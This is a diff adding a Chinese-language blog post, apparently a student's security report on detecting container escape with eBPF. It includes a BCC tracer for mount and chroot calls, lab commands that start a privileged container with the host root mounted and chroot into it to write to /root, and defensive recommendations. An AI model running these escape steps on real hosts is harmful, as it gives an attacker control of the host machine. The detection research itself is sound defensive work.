@@ -143,6 +143,225 @@
       </categories>
   </entry>
   <entry>
+    <title>基於eBPF的容器逃逸行為偵測機制研究與實作</title>
+    <url>/20250513/</url>
+    <content><![CDATA[<h1 id="基於eBPF的容器逃逸行為偵測機制研究與實作"><a href="#基於eBPF的容器逃逸行為偵測機制研究與實作" class="headerlink" title="基於eBPF的容器逃逸行為偵測機制研究與實作"></a>基於eBPF的容器逃逸行為偵測機制研究與實作</h1><p>前情提要: 這篇是我的資安研究報告，內容原本是做成docx檔案，現在為了放上blog才轉成<code>.md</code>，若有沒正確轉成markdown語法而造成版面跑掉的話請多包涵:D</p>
+<h1 id="一、緒論"><a href="#一、緒論" class="headerlink" title="一、緒論"></a>一、緒論</h1><p>隨著容器化技術（Containerization）在各領域的廣泛應用，系統資源的管理與部署效率大幅提升。Docker、containerd 等容器平台讓應用程式在不同環境中快速部署、隔離運行並高效擴展。然而，這種虛擬化程度較低的隔離機制也帶來潛在風險——一旦攻擊者突破容器限制，可能對宿主機（Host Machine）造成嚴重威脅。</p>
+<p>傳統上，作業系統透過 namespace 和 cgroup 機制來隔離容器與主機資源。然而，若容器被賦予過多權限（例如 –privileged），將獲得近似宿主機的能力，可能導致<strong>容器逃逸（Container Escape）</strong>攻擊。攻擊者可從受限容器中控制宿主機，取得 root 權限、存取 &#x2F;etc&#x2F;passwd 等敏感檔案，甚至橫向移動攻擊其他容器。</p>
+<p>為應對這些安全威脅，eBPF（Extended Berkeley Packet Filter） 自 2014 年引入以來，憑藉其高效性與安全性，已成為容器安全監控的熱門技術。它允許使用者撰寫微型程式並安全地掛載到內核的特定 hook 點（如 syscall、kprobe），在不中斷系統運作的情況下即時監控與攔截系統行為。</p>
+<h2 id="報告目的"><a href="#報告目的" class="headerlink" title="報告目的:"></a>報告目的:</h2><ul>
+<li>探討 eBPF 如何應用於容器逃逸偵測。</li>
+<li>建構實驗環境，模擬典型的容器逃逸行為。</li>
+<li>使用 eBPF 偵測並聚焦於模擬簡單的 chroot 和 mount 逃逸場景。</li>
+<li>驗證攻擊是否成功並能被有效捕捉，評估該偵測方法的實用性與可行性。</li>
+</ul>
+<h1 id="二、eBPF-技術背景"><a href="#二、eBPF-技術背景" class="headerlink" title="二、eBPF 技術背景"></a>二、eBPF 技術背景</h1><p>eBPF(Extended Berkeley Packet Filter)最初設計於1992年的BPF (Berkeley Packet Filter)，用於在內核空間過濾封包，提升網路封包處理效率，傳統BPF的功能有限，僅能處理簡單的封包邏輯，而eBPF作為其延伸版本，自linux kernel 3.18以來大幅擴展能力，成為一個能在內核安全執行自訂邏輯的沙箱虛擬機。<br>eBPF最大的特性是: 「無需修改內核原始碼，即可即時插入內核程式邏輯」，這使它成為理想的內核觀察者，</p>
+<h2 id="具備以下優勢"><a href="#具備以下優勢" class="headerlink" title="具備以下優勢:"></a>具備以下優勢:</h2><ul>
+<li><strong>動態載入、不需重啟系統</strong>: eBPF 程式可以動態載入至特定 hook 點，例如syscall、tracing、perf event、網路等，無需修改或重編譯核心。</li>
+<li><strong>安全性設計</strong>: 所有eBPF程式都會經過內核verifier去做驗證，保證其不會進入無限迴圈、不會越界訪問、不會導致系統崩潰，因此執行於內核空間，還是有極高的安全性。</li>
+<li><strong>效能開銷低</strong>: 相比傳統syscall hooking或其他內核模組，eBPF有更低的效能損耗，適合長時間、低干擾地執行監控任務。</li>
+<li><strong>語言支援強大</strong>: eBPF 程式通常以C或Rust撰寫，Python和Go用於使用者空間的編譯、載入和資料處理。</li>
+</ul>
+<h2 id="eBPF-的關鍵組件"><a href="#eBPF-的關鍵組件" class="headerlink" title="eBPF 的關鍵組件:"></a>eBPF 的關鍵組件:</h2><ul>
+<li><strong>BPF程式(eBPF Program)</strong>: 使用者撰寫的微型邏輯程式，會被掛載到指定的 hook 點。</li>
+<li><strong>BPF Map</strong>: 內核與使用者空間共用的資料結構，可用來交換資料，如記錄事件、累積計數、傳遞訊息。</li>
+<li><strong>使用者空間Loader</strong>: 負責編譯、驗證並載入eBPF程式，常見工具如 bcc、bpftrace、libbpf。</li>
+<li><strong>tracing 與 kprobe&#x2F;kretprobe</strong>: eBPF可以附掛於 kernel function的進入點(kprobe)或離開點(kretprobe)，實現行為追蹤。</li>
+</ul>
+<h2 id="在資訊安全的應用"><a href="#在資訊安全的應用" class="headerlink" title="在資訊安全的應用:"></a>在資訊安全的應用:</h2><ul>
+<li><strong>惡意程式偵測</strong>: 利用eBPF追蹤異常系統呼叫，如可疑的 file I&#x2F;O、網路連線或權限提升。</li>
+<li><strong>容器行為監控</strong>: 追蹤容器中執行的 syscall，辨識是否有異常逃逸操作。</li>
+<li><strong>RASP(Runtime Application Self Protection)</strong>: RASP可利用eBPF 監控應用程式運行時的系統呼叫，動態檢測異常行為，如未授權的檔案訪問。</li>
+</ul>
+<p>本次報告透過bcc工具集撰寫eBPF程式，監控容器中是否有進行chroot或 mount系統呼叫，藉此識別潛在逃逸行為。</p>
+<h1 id="三、容器逃逸技術概論"><a href="#三、容器逃逸技術概論" class="headerlink" title="三、容器逃逸技術概論"></a>三、容器逃逸技術概論</h1><h2 id="1-容器逃逸的背景"><a href="#1-容器逃逸的背景" class="headerlink" title="1. 容器逃逸的背景"></a>1. 容器逃逸的背景</h2><p>容器化技術(如:Docker)為開發領域帶來極大的便捷性，尤其在資源隔離、快速部署與應用擴展方面表現突出，不過，這與虛擬機(VM)不同，容器的隔離機制較為輕量，容器和宿主機共享相同的操作系統核心(kernel)，代表若容器內部的應用程序或攻擊者能突破容器內的安全限制，就有可能對宿主機或其他容器造成威脅，這種攻擊方式被稱為「容器逃逸(Container Escape)」。</p>
+<p>容器逃逸指的是<strong>攻擊者從一個容器內部，繞過容器的隔離機制，進而取得宿主機的控制權或對其他容器造成影響</strong>。容器逃逸通常涉及利用容器的配置錯誤、漏洞或過度授權的權限進行攻擊。</p>
+<h2 id="2-容器逃逸的典型手段"><a href="#2-容器逃逸的典型手段" class="headerlink" title="2. 容器逃逸的典型手段"></a>2. 容器逃逸的典型手段</h2><p>容器逃逸的攻擊手段多種多樣，常見的手段包括: </p>
+<ul>
+<li><strong>利用容器權限過高</strong>: 若容器以 –privileged 模式運行，將擁有接近宿主機的操作權限，攻擊者可以繞過容器隔離。</li>
+<li><strong>漏洞利用</strong>: 攻擊者可透過容器中運行的應用程式或內核漏洞，利用已知漏洞發起攻擊，如: CVE-2019-5736 (runc 漏洞)。</li>
+<li><strong>修改容器配置或掛載點</strong>: 攻擊者可通過篡改容器中的掛載點(例如 &#x2F;proc、&#x2F;sys 目錄)，直接訪問宿主機的敏感檔案系統。</li>
+<li><strong>利用 chroot或 mount系統呼叫</strong>: 若容器內部的應用程式能夠調用 chroot或 mount系統呼叫，便能將根目錄或其他檔案系統映射到宿主機，從而實現逃逸。</li>
+</ul>
+<p><img src="/images/image1.png"><br>容器逃逸行為的攻擊架構流程圖。(使用mermaid繪製)</p>
+<h2 id="3-本報告的容器逃逸案例"><a href="#3-本報告的容器逃逸案例" class="headerlink" title="3. 本報告的容器逃逸案例"></a>3. 本報告的容器逃逸案例</h2><p>本報告使用兩種系統呼叫作為容器逃逸的核心攻擊手段:</p>
+<ul>
+<li><strong>chroot系統呼叫</strong>: chroot是一種將進程根目錄更改為指定目錄的操作。攻擊者通過使用 chroot可以將容器中的根目錄映射到宿主機的某一位置，從而使容器內部的進程能夠直接訪問宿主機的檔案系統。若容器有足夠權限執行 chroot，將會導致容器逃逸。</li>
+<li><strong>mount系統呼叫</strong>: mount呼叫用於將外部檔案系統掛載到指定目錄。如果攻擊者能夠在容器中執行 mount操作並將宿主機的檔案系統掛載到容器中，就能夠繞過容器的隔離機制，直接進到宿主機的檔案系統，進而實現逃逸。</li>
+</ul>
+<h2 id="4-逃逸的風險與影響"><a href="#4-逃逸的風險與影響" class="headerlink" title="4. 逃逸的風險與影響"></a>4. 逃逸的風險與影響</h2><p>成功的容器逃逸攻擊不僅意味著攻擊者能夠繞過容器的隔離，還可能帶來嚴重的安全問題，具體影響包括: </p>
+<ul>
+<li><strong>取得宿主機控制權</strong>: 攻擊者可以利用容器逃逸攻擊獲得宿主機的 root權限，進而執行任意命令或改動系統設置。</li>
+<li><strong>跨容器攻擊</strong>: 一旦攻擊者成功逃逸容器，便能夠對其他容器進行橫向移動，破壞整個容器環境中的應用。</li>
+<li><strong>資料竊取與損壞</strong>: 攻擊者可讀取或修改宿主機上的敏感資料，甚至可能破壞整體系統。</li>
+</ul>
+<h2 id="5-容器逃逸防禦"><a href="#5-容器逃逸防禦" class="headerlink" title="5. 容器逃逸防禦"></a>5. 容器逃逸防禦</h2><p>為了防範容器逃逸，企業與開發者需遵循最佳安全實踐，包括但不限於: </p>
+<ul>
+<li><strong>限制容器權限</strong>: 避免容器以 –privileged 模式運行，並確保容器內的應用程序不具備過多的操作系統權限。</li>
+<li><strong>使用最新的內核版本</strong>: 定期更新內核及容器平台、修補已知漏洞、加強容器配置的安全性。</li>
+<li><strong>強化系統呼叫過濾</strong>: 透過eBPF等技術，對關鍵系統呼叫(如 mount、chroot)進行監控與過濾，及時發現異常行為。</li>
+</ul>
+<p><img src="/images/image2.png"><br>對關鍵系統呼叫(如 mount、chroot)進行監控架構圖。(使用mermaid繪製)</p>
+<h1 id="四、實驗環境與配置"><a href="#四、實驗環境與配置" class="headerlink" title="四、實驗環境與配置"></a>四、實驗環境與配置</h1><p>以下內容可搭配個人實際demo影片: <a href="https://www.youtube.com/watch?v=K-QwDysbjXU">https://www.youtube.com/watch?v=K-QwDysbjXU</a></p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/K-QwDysbjXU?si=VGYvio-XmMEqO0F2" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<h2 id="1-環境架構總覽"><a href="#1-環境架構總覽" class="headerlink" title="1. 環境架構總覽"></a>1. 環境架構總覽</h2><p>本次實驗以一Ubuntu虛擬機架構進行，VM同時作為監控端(eBPF 偵測機制所在)與繞過端(發動容器逃逸行為)。</p>
+<ul>
+<li>虛擬機作業系統: Ubuntu22.04 LTS(宿主機)、Linux 6.8.0-59-generic</li>
+<li>容器映像檔: ubuntu: 22.04 (攻擊容器)</li>
+<li>容器管理工具: Docker version 28.1.1</li>
+<li>eBPF 工具鏈: BCC(BPF Compiler Collection)</li>
+</ul>
+<h2 id="2-系統前置安裝-Ubuntu宿主機執行"><a href="#2-系統前置安裝-Ubuntu宿主機執行" class="headerlink" title="2. 系統前置安裝(Ubuntu宿主機執行)"></a>2. 系統前置安裝(Ubuntu宿主機執行)</h2><p>以下操作皆於宿主機進行，用以安裝eBPF所需的套件及 Docker 環境:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image3.png"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install -y docker.io bpfcc-tools python3-bpfcc linux-headers-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image4.png"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now docker</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image5.png"></p>
+<p>確認 BPF 工具能正常使用: </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /usr/share/bcc/tools/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image6.png"></p>
+<h2 id="3-建立eBPF偵測程式-宿主機執行"><a href="#3-建立eBPF偵測程式-宿主機執行" class="headerlink" title="3. 建立eBPF偵測程式(宿主機執行)"></a>3. 建立eBPF偵測程式(宿主機執行)</h2><p>使用 BCC提供的 trace 工具，掛勾監控 syscall__mount和syscall__chroot，以即時偵測容器中可疑的系統呼叫:</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">prog = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int trace_mount(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">    bpf_trace_printk(&quot;MOUNT by pid %d\\n&quot;, bpf_get_current_pid_tgid() &gt;&gt; 32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int trace_chroot(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">    bpf_trace_printk(&quot;CHROOT by pid %d\\n&quot;, bpf_get_current_pid_tgid() &gt;&gt; 32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b = BPF(text=prog)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;__x64_sys_mount&quot;</span>, fn_name=<span class="string">&quot;trace_mount&quot;</span>)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;__x64_sys_chroot&quot;</span>, fn_name=<span class="string">&quot;trace_chroot&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Tracing mount/chroot syscalls... Ctrl-C to exit.&quot;</span>)</span><br><span class="line">b.trace_print()</span><br></pre></td></tr></table></figure>
+<p>上面的程式碼，其中bpf_get_current_pid_tgid()要右移32位元是因為這條function是回傳 64 位元值，高32位元為 PID，低32位元為 TGID，需要右移32位元才可以提取PID。<br>監控時會在終端機輸出: </p>
+<p><img src="/images/image7.png"></p>
+<h2 id="4-建立攻擊容器-宿主機執行"><a href="#4-建立攻擊容器-宿主機執行" class="headerlink" title="4. 建立攻擊容器(宿主機執行)"></a>4. 建立攻擊容器(宿主機執行)</h2><p>使用以下指令建立權限過高的容器，並將宿主機的檔案系統掛載到容器內: </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it--rm \</span><br><span class="line">  --privileged \</span><br><span class="line">  -v /: /host: rw \</span><br><span class="line">  ubuntu: 22.04 \</span><br><span class="line">  bash</span><br></pre></td></tr></table></figure>
+<p>這段shell意思: 開啟一個可互動容器(-it)、移除容器結束後的殘留(–rm)、開啟 –privileged 權限、掛載整個 &#x2F;(宿主機根目錄)至容器內的 &#x2F;host。<br>(這個容器是簡化的場景，未來研究可嘗試無–privileged 的逃逸，相關補充可查詢CVE-2024-21626)</p>
+<h2 id="5-在容器中發動逃逸攻擊-容器內部執行"><a href="#5-在容器中發動逃逸攻擊-容器內部執行" class="headerlink" title="5. 在容器中發動逃逸攻擊(容器內部執行)"></a>5. 在容器中發動逃逸攻擊(容器內部執行)</h2><p>在容器內部執行下列指令以逃逸至宿主機的環境: </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /host/bin/bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HACKED by container&quot;</span> &gt;&gt; /root/HACKED.txt</span><br></pre></td></tr></table></figure>
+<p>若成功進入宿主機根目錄，且可以直接將檔案寫入&#x2F;root而不用再加上sudo，即代表逃逸成功。<br><img src="/images/image8.png"><br>同時，宿主機上開啟的 trace 命令應輸出 MOUNT與 CHROOT系統呼叫紀錄，可用作事後調查依據。<br><img src="/images/image9.png"></p>
+<h1 id="五、eBPF偵測原理"><a href="#五、eBPF偵測原理" class="headerlink" title="五、eBPF偵測原理"></a>五、eBPF偵測原理</h1><h2 id="1-為何選擇-eBPF"><a href="#1-為何選擇-eBPF" class="headerlink" title="1. 為何選擇 eBPF ?"></a>1. 為何選擇 eBPF ?</h2><p>eBPF(extended Berkeley PacketFilter)原本是為高效處理封包過濾而生，但近年來演進成為一種「可安全在核心層執行使用者自定義程式」的通用技術，具備以下優點: </p>
+<ul>
+<li><strong>零撰寫核心模組風險</strong>: 透過verifier保證邏輯安全，不會導致Kernel crash。</li>
+<li><strong>即時性高</strong>: 直接嵌入在kernel執行流程中，無須上下文切換。</li>
+<li><strong>可掛鉤syscall</strong>: 可直接追蹤如mount、chroot等系統呼叫，為行為型偵測提供基礎。</li>
+<li><strong>支援tracepoint&#x2F;kprobe&#x2F;uprobe</strong>: 可追蹤核心或應用程式層的各種執行點。</li>
+</ul>
+<h2 id="2-偵測原理概述"><a href="#2-偵測原理概述" class="headerlink" title="2. 偵測原理概述"></a>2. 偵測原理概述</h2><p>容器逃逸常仰賴對宿主機的掛載與chroot操作，eBPF可以在syscall層級偵測這些異常操作。<br>主要偵測目標: </p>
+<ul>
+<li><strong>mount()</strong>: 將宿主機檔案系統掛載進容器。</li>
+<li><strong>chroot()</strong>: 改變根目錄以達到逃逸目的。<br>核心偵測邏輯: </li>
+<li>觀察非預期的mount行為，尤其是對 &#x2F; 或宿主機目錄的掛載。</li>
+<li>判斷是否在容器中發生chroot，且目標為宿主機根目錄(例如: &#x2F;host)。</li>
+<li>搭配 PID 判斷是否來自runc或其他container runtime。</li>
+</ul>
+<h2 id="3-輸出結果與意義"><a href="#3-輸出結果與意義" class="headerlink" title="3. 輸出結果與意義"></a>3. 輸出結果與意義</h2><p>當我們在宿主機開啟上述eBPF偵測程式時，並從容器內部執行逃逸行為(chroot&#x2F;host)，輸出如下:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.624276: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span>                         </span><br><span class="line">b<span class="string">&#x27;   &lt;...&gt;-27148   [000] ...21 12859.718135: bpf_trace_printk: CHROOT by pid 27148\\n&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>runc: [2: INIT] 表示該系統呼叫發自 container 初始化進程。<br>pid 27112 則是可被後續手動比對或自動分析的依據。<br>一連串短時間內的 MOUNT→ CHROOT，表示容器進程試圖脫離原有檔案系統限制，為明顯的逃逸徵兆。</p>
+<h1 id="六、實驗結果與分析"><a href="#六、實驗結果與分析" class="headerlink" title="六、實驗結果與分析"></a>六、實驗結果與分析</h1><h2 id="1-實驗設定回顧"><a href="#1-實驗設定回顧" class="headerlink" title="1. 實驗設定回顧"></a>1. 實驗設定回顧</h2><p>本實驗於單一台Ubuntu22.04虛擬機進行，模擬如下場景: </p>
+<ul>
+<li>宿主機安裝並執行eBPF偵測程式。</li>
+<li>容器內部透過 –privileged 權限啟動後，執行掛載整個宿主機目錄(-v &#x2F;: &#x2F;host)，再利用 chroot&#x2F;host轉移執行環境至宿主機。<br>最後在容器內直接寫入&#x2F;root，發現成功寫入&#x2F;root&#x2F;HACKED.txt且獲得宿主機root權限，證實逃逸成功。</li>
+</ul>
+<h2 id="2-eBPF偵測輸出分析"><a href="#2-eBPF偵測輸出分析" class="headerlink" title="2. eBPF偵測輸出分析"></a>2. eBPF偵測輸出分析</h2><p>當容器內進行 mount與 chroot操作時，宿主機終端機立即輸出以下訊息: </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496559: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496754: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496972: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497298: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497563: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497795: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.499010: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.501682: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.502590: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.502777: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>從輸出可以觀察出短時間內連續的 MOUNT行為，且來自同一PID，屬於典型逃逸特徵。<br>runc: [2: INIT] 表示該行為由 container runtime 所觸發，並非一般使用者 shell，風險更高。<br>透過 pid 27112 進一步交叉比對容器內外進程，可確定行為來源與目的。</p>
+<h2 id="3-容器內部行為觀察"><a href="#3-容器內部行為觀察" class="headerlink" title="3. 容器內部行為觀察"></a>3. 容器內部行為觀察</h2><p>在容器中執行: </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /host/bin/bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HACKED by container&quot;</span> &gt;&gt; /root/HACKED.txt</span><br></pre></td></tr></table></figure>
+<p>結果為真的寫入&#x2F;root，表示當前shell已轉移至宿主機環境。<br>此時執行 ls &#x2F;root等操作，皆會作用於宿主機的實體 &#x2F;root目錄，若未做防護，攻擊者可直接竄改宿主機關鍵設定或寫入後門程式。</p>
+<h2 id="4-安全分析與行為特徵彙整"><a href="#4-安全分析與行為特徵彙整" class="headerlink" title="4. 安全分析與行為特徵彙整"></a>4. 安全分析與行為特徵彙整</h2><table>
+<thead>
+<tr>
+<th>行為</th>
+<th>是否異常</th>
+<th>說明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>掛載 &#x2F; 或 &#x2F;host</td>
+<td>是</td>
+<td>表示容器嘗試讀取整個宿主機檔案系統</td>
+</tr>
+<tr>
+<td>執行 chroot&#x2F;host</td>
+<td>是</td>
+<td>將容器內 shell 移至宿主機空間</td>
+</tr>
+<tr>
+<td>使用者為 root</td>
+<td>需視情境</td>
+<td>若容器內 root 對應宿主機 root為嚴重問題；若啟用user namespace，風險較低</td>
+</tr>
+<tr>
+<td>若 PID 出現在 eBPF 輸出中，且與 runc 有關</td>
+<td>是</td>
+<td>多為自動化 escape 或惡意 runtime 行為</td>
+</tr>
+</tbody></table>
+<h2 id="5-成效總結"><a href="#5-成效總結" class="headerlink" title="5. 成效總結"></a>5. 成效總結</h2><ul>
+<li>eBPF 成功偵測容器內部異常的系統呼叫，實現了即時、低延遲的偵測效果。</li>
+<li>在不改動 kernel 原始碼的前提下，完成行為型逃逸攻擊的準確攔截與記錄。</li>
+<li>偵測邏輯簡單清晰，可進一步拓展至多種 container runtime 與複雜場景。</li>
+</ul>
+<h1 id="七、對策與建議"><a href="#七、對策與建議" class="headerlink" title="七、對策與建議"></a>七、對策與建議</h1><h2 id="1-限制容器權限-避免使用-–privileged"><a href="#1-限制容器權限-避免使用-–privileged" class="headerlink" title="1. 限制容器權限: 避免使用 –privileged"></a>1. 限制容器權限: 避免使用 –privileged</h2><p>本次容器能成功掛載宿主機根目錄並執行 chroot的主要原因，是 Docker 使用了 –privileged 參數。<br>該參數會賦予容器所有宿主機的 Linux capabilities(如 CAP_SYS_ADMIN)，基本等同於 root。<br>建議做法: </p>
+<ul>
+<li>除非必要，嚴禁使用 –privileged 啟動容器。</li>
+<li>使用 Docker Capabilities 精細調控所需的權限，例如移除 SYS_ADMIN、SYS_CHROOT等敏感能力。</li>
+</ul>
+<h2 id="2-文件系統掛載安全控管"><a href="#2-文件系統掛載安全控管" class="headerlink" title="2. 文件系統掛載安全控管"></a>2. 文件系統掛載安全控管</h2><p>攻擊中將 &#x2F; 掛載至 &#x2F;host，進一步配合 chroot進行空間轉移。<br>建議做法: </p>
+<ul>
+<li>禁止容器掛載敏感路徑(例如宿主機的 &#x2F; 或 &#x2F;proc等)。</li>
+<li>搭配 Seccomp 或 AppArmor 配置限制 mount() 等系統呼叫。</li>
+</ul>
+<h2 id="3-使用eBPF持續監控敏感-syscall"><a href="#3-使用eBPF持續監控敏感-syscall" class="headerlink" title="3. 使用eBPF持續監控敏感 syscall"></a>3. 使用eBPF持續監控敏感 syscall</h2><p>本實驗展示了eBPF能有效監控 mount與 chroot系統呼叫，並記錄可疑行為。<br>相較於傳統 log 分析工具，eBPF 擁有以下優勢: </p>
+<ul>
+<li>可即時追蹤內核層級活動，不需仰賴容器內部 agent。</li>
+<li>可客製監控邏輯，精準匹配逃逸行為模式。<br>建議做法: </li>
+<li>常駐執行簡易eBPF探測模組，設定觸發條件與警報通知。</li>
+<li>搭配 tracee、Tetragon 等開源框架建構eBPF安全監控系統。</li>
+</ul>
+<h2 id="4-實作-Namespace-隔離強化"><a href="#4-實作-Namespace-隔離強化" class="headerlink" title="4. 實作 Namespace 隔離強化"></a>4. 實作 Namespace 隔離強化</h2><p>若容器逃逸行為未搭配完善的 namespace 隔離設計，容易成功竄改宿主系統。<br>建議做法: </p>
+<ul>
+<li>啟用 user namespace，以確保容器內部 root權限對應到宿主非 rootUID。</li>
+<li>使用 gVisor、Kata Containers 等加強隔離型 container runtime。</li>
+</ul>
+<h2 id="5-eBPF安全策略設計建議"><a href="#5-eBPF安全策略設計建議" class="headerlink" title="5. eBPF安全策略設計建議"></a>5. eBPF安全策略設計建議</h2><table>
+<thead>
+<tr>
+<th>偵測行為</th>
+<th>建議策略</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mount() 呼叫</td>
+<td>僅允許預先定義的 mount目的與來源</td>
+</tr>
+<tr>
+<td>chroot() 呼叫</td>
+<td>僅允許特定目錄或 UID 呼叫執行</td>
+</tr>
+<tr>
+<td>PID 來自 runc</td>
+<td>加強審查 container runtime 初始化行為</td>
+</tr>
+<tr>
+<td>容器 PID 與宿主機交叉</td>
+<td>若 PID 同時出現在 container 與 host，可標記為異常</td>
+</tr>
+</tbody></table>
+<h1 id="八、結論"><a href="#八、結論" class="headerlink" title="八、結論"></a>八、結論</h1><p>本報告深入探討了使用eBPF偵測容器逃逸行為的可行性與實作細節，透過在單一台 Ubuntu22.04 虛擬機中進行的實驗，我們成功模擬出一個基於 –privileged權限與chroot()技術的容器逃逸案例，並證明eBPF可在不干擾系統運作的情況下，即時攔截與記錄高風險的系統呼叫(如 mount() 和 chroot())，該偵測方式具備低延遲、低開銷與高度靈活性，對於雲端原生環境中零信任架構的實現具有極高的實務價值。</p>
+<p>從安全防禦角度來看，eBPF 並非單一解方，而是應當作一個可擴充的監控框架，與Docker權限控管、Namespace隔離、系統資源限制(如 Seccomp、AppArmor)等多層防禦機制整合。藉由持續性偵測與行為模式分析，eBPF 可有效從微觀層面補足傳統安全方案在容器場域中的不足之處。</p>
+<p>最後，雖然本次實驗選擇使用較簡化的非CVE攻擊路徑，並僅以基本的 tracepoint 做偵測，但這也顯示出: 即使是初階的eBPF腳本與行為觀察，也能在實務中產生實質的安全防禦成效，未來可結合 ML 分析 eBPF 輸出的行為模式，實現自動化異常檢測。<br><img src="/images/image10.png"><br>此圖為此次報告完整架構圖，可以清楚看到chroot到宿主機的全過程 (使用mermaid繪製)</p>
+<h1 id="九、心得"><a href="#九、心得" class="headerlink" title="九、心得"></a>九、心得</h1><p>這份的主題啟發來自最近跟著實驗室在做專題時，同一台伺服器上有許多docker容器，有的容器是已對外公開的網頁，有的是對外公開的API，那我要怎麼確保我自己開的docker不會去影響到其他學長姐的成果，所以我就從這個角度往資安方向去做衍生，最一開始想的是: 我有可能可以從我的docker裡面去影響到全域的環境變數嗎? 還真的被我找到一篇2019年的漏洞，不過它可以直接造成RCE就是了，CVE編號: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5736">CVE-2019-5736</a>，主要是在講二進位檔案會造成RCE，詳細邏輯不詳談，但事實是可以做得到的。</p>
+<p>再來就是去年的<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8695">CVE-2024-8695</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8696">CVE-2024-8696</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21626">CVE-2024-21626</a>，這三篇基本上都是容器逃逸的實際漏洞，也因此這份報告選用chroot 和 mount 作為模擬場景，而這些CVE邏輯跟這份報告所做的差不多，只是需要多加一些bypass的地方需要更深入研究，如果有空想要復現的話就把–privileged拿掉，不要讓docker容器權限這麼高，再實際去exploit-db找腳本試，應該也是個蠻好玩的復現(個人覺得這總比apache好玩多了xd)，這次最困難的地方大概是釐清一些eBPF的基本機制和環境吧，繞過的邏輯順了以後其實沒有太難，基本上有一大半的時間都在調整環境，一下子linux headers版本衝突，一下子docker環境不符合，一下子又抓不到bcc位置，中途還想說再不行我就鬼轉題目來研究了，不過好險最後一步一步的調整就成功復現了!</p>
+<h1 id="十、部分參考資料"><a href="#十、部分參考資料" class="headerlink" title="十、部分參考資料"></a>十、部分參考資料</h1><p>GitHub:<br><a href="https://github.com/iovisor/bcc">https://github.com/iovisor/bcc</a>,<br><a href="https://github.com/aquasecurity/tracee">https://github.com/aquasecurity/tracee</a>,<br><a href="https://github.com/pathtofile/bad-bpf">https://github.com/pathtofile/bad-bpf</a>, </p>
